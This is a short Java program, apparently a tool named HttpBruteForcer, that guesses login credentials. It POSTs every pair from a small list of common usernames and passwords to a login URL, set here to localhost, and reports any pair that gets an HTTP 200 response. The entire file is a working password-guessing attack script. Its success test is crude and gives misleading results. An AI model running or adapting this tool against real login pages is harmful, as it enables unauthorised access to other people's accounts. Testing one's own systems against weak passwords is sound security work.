package tools.brute;

import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class HttpBruteForcer {
    public static void main(String[] args) throws Exception {
        String targetUrl = "http://localhost/login";
        String[] users = {"admin", "user"};
        String[] passwords = {"123456", "password", "admin"};

        for (String user : users) {
            for (String pass : passwords) {
                URL url = new URL(targetUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String data = "username=" + user + "&password=" + pass;
                conn.getOutputStream().write(data.getBytes());

                int code = conn.getResponseCode();
                if (code == 200) {
                    System.out.println("Login possivelmente bem-sucedido: " + user + "/" + pass);
                }

                conn.disconnect();
            }
        }
    }
}
